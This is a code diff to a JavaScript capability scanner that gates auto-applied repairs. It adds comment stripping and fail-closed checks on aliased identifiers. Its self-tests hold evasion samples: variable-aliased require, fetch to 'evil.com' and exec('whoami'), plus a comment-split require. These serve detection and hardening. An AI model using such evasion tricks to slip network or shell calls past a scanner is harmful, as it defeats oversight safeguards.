@@ -202,7 +202,12 @@ function applyRule(rule, posix, base) {
     case "extension-in":
       return matchesExtensionIn(posix, rule.extensions, rule.case_insensitive !== false);
     case "path-contains-and-basename-suffix":
-      return posix.includes(rule.path_contains) && base.endsWith(rule.basename_suffix);
+      // posix is normalized WITHOUT a leading slash (normalizeRelPosix strips
+      // it), so a top-level "workers/x.prompt.md" would never contain the
+      // anchored "/workers/" substring on its own -- only a nested path like
+      // "a/workers/x.prompt.md" would. Prepend "/" before the containment
+      // check so top-level and nested paths are both matched consistently.
+      return ("/" + posix).includes(rule.path_contains) && base.endsWith(rule.basename_suffix);
     case "basename-equals":
       return base === rule.basename;
     case "basename-equals-or-path-regex-or-basename-suffix": {
@@ -259,11 +264,83 @@ function byteLength(str) {
 }
 
 /**
+ * sanitizeForScan(text) -> string
+ *
+ * String-literal-aware comment stripper + whitespace collapser, run BEFORE
+ * pattern matching so the syntactic allowlist can't be defeated by:
+ *   - comment-split keywords: `req/**\/uire("http")` -> `require("http")`
+ *   - comment/whitespace insertion between an identifier and its call:
+ *     `require /* x *\/ ("http")` -> `require ("http")` (still matches
+ *     `\brequire\s*\(`).
+ *
+ * `//` and `/* *\/` are only treated as comments OUTSIDE string literals
+ * (single/double/backtick) so a legitimate string like "http://example.com"
+ * is never mistaken for a line comment and truncated -- that would be a
+ * fail-OPEN regression (silently dropping the tail of a payload we still
+ * need to scan). Comments are removed entirely (not blanked-with-spaces)
+ * so a comment sitting directly between two keyword halves can't leave a
+ * whitespace gap that would otherwise defeat the bare-token regexes below;
+ * genuine whitespace between separate tokens survives as a single space,
+ * so real space-separated words are never merged into a keyword they don't
+ * form. This mirrors graphlint.js sanitize()'s string-literal-aware comment
+ * handling but additionally collapses whitespace (graphlint preserves line
+ * structure for line numbers; this scan has no such requirement).
+ */
+function sanitizeForScan(text) {
+  const n = text.length;
+  let out = "";
+  let i = 0;
+  while (i < n) {
+    const c = text[i];
+    const c2 = text.slice(i, i + 2);
+    if (c2 === "//") {
+      const nl = text.indexOf("\n", i);
+      i = nl === -1 ? n : nl;
+      continue;
+    }
+    if (c2 === "/*") {
+      const end = text.indexOf("*/", i + 2);
+      i = end === -1 ? n : end + 2;
+      continue;
+    }
+    if (c === "'" || c === '"' || c === "`") {
+      const quote = c;
+      const isTemplate = quote === "`";
+      out += c;
+      let j = i + 1;
+      while (j < n) {
+        if (text[j] === "\\") { out += text[j] + (text[j + 1] || ""); j += 2; continue; }
+        if (text[j] === quote) { out += text[j]; j++; break; }
+        if (!isTemplate && text[j] === "\n") break; // unterminated ' or " ends at newline
+        out += text[j];
+        j++;
+      }
+      i = j;
+      continue;
+    }
+    out += c;
+    i++;
+  }
+  return out.replace(/\s+/g, " ").trim();
+}
+
+/**
  * capabilityScan(texts) -> { no_external_calls, matched_patterns, unprovable }
  *
  * FAIL-CLOSED: no_external_calls is true ONLY if NO external-call pattern
  * matches AND NO unprovable-construct matches. This is a syntactic allowlist,
  * not a proof (risk-policy.json auto_apply_eligibility, is_proof: false).
+ *
+ * Matching runs against the SANITIZED (comment-stripped, whitespace-
+ * collapsed) view of the payload -- see sanitizeForScan -- so comment-split
+ * and comment/whitespace-insertion tricks can't evade either the
+ * external-call patterns or the unprovable-construct patterns (which now
+ * also include bare-identifier fail-closed checks: `require`, `import`,
+ * `fetch`, `exec`/`execSync`/`execFile*`/`spawn*`, `child_process`, `eval`,
+ * `Function`, `Reflect.construct`, `globalThis`, `XMLHttpRequest`,
+ * `WebSocket`, and the node net modules -- these match the identifier as a
+ * bare token so aliasing it through a variable, e.g. `const r = require;
+ * r("http")`, can no longer launder it into an eligible payload).
  */
 function capabilityScan(texts) {
   const blob = Array.isArray(texts) ? texts.join("\n") : String(texts || "");
@@ -281,13 +358,15 @@ function capabilityScan(texts) {
     };
   }
 
+  const sanitized = sanitizeForScan(blob);
+
   const matched = [];
   for (const p of POLICY.externalCallPatterns) {
-    if (p.re.test(blob)) matched.push(p.id);
+    if (p.re.test(sanitized)) matched.push(p.id);
   }
   const unprovable = [];
   for (const p of POLICY.unprovablePatterns) {
-    if (p.re.test(blob)) unprovable.push(p.id);
+    if (p.re.test(sanitized)) unprovable.push(p.id);
   }
 
   return {
@@ -350,6 +429,54 @@ function selftest() {
     "non-manager-executable-classified-code-not-manager",
     workerClass.repairClass === "code" && workerClass.isManager === false && workerClass.kind === "executable",
     JSON.stringify(workerClass)
+  );
+
+  // 6. Bypass regressions (Kimi/orchestrator finding): variable indirection
+  // and comment-split must both fail closed, and clean prose/knob content
+  // must stay eligible.
+  const variableIndirectionRequire = capabilityScan(["const r = require; r('http');"]);
+  rec(
+    "bypass-variable-indirection-require-not-eligible",
+    variableIndirectionRequire.no_external_calls === false && variableIndirectionRequire.unprovable.length > 0,
+    JSON.stringify(variableIndirectionRequire)
+  );
+
+  const variableIndirectionFetch = capabilityScan(["const f = fetch; f('http://evil.com');"]);
+  rec(
+    "bypass-variable-indirection-fetch-not-eligible",
+    variableIndirectionFetch.no_external_calls === false && variableIndirectionFetch.unprovable.length > 0,
+    JSON.stringify(variableIndirectionFetch)
+  );
+
+  const commentSplitRequire = capabilityScan(["req/**/uire(\"http\").get('x');"]);
+  rec(
+    "bypass-comment-split-require-not-eligible",
+    commentSplitRequire.no_external_calls === false,
+    JSON.stringify(commentSplitRequire)
+  );
+
+  const variableIndirectionExec = capabilityScan(["const run = exec; run('whoami');"]);
+  rec(
+    "bypass-variable-indirection-exec-not-eligible",
+    variableIndirectionExec.no_external_calls === false && variableIndirectionExec.unprovable.length > 0,
+    JSON.stringify(variableIndirectionExec)
+  );
+
+  const cleanKnobStillEligible = capabilityScan(['{ "max_retries": 3, "note": "increase timeout for the slow adapter" }']);
+  rec(
+    "bypass-fix-clean-knob-still-eligible",
+    cleanKnobStillEligible.no_external_calls === true,
+    JSON.stringify(cleanKnobStillEligible)
+  );
+
+  // 7. workers/*.prompt.md must classify as kind:"prompt" (typed), not
+  // kind:"data" -- path_contains("/workers/") must match a top-level
+  // "workers/..." path, not only a nested one.
+  const workerPromptClass = classifyRepair("workers/gather.prompt.md", "You are a gather. Do safe work only.");
+  rec(
+    "worker-prompt-classified-kind-prompt",
+    workerPromptClass.repairClass === "typed" && workerPromptClass.isManager === false && workerPromptClass.kind === "prompt",
+    JSON.stringify(workerPromptClass)
   );
 
   const allPass = results.every((r) => r.pass);
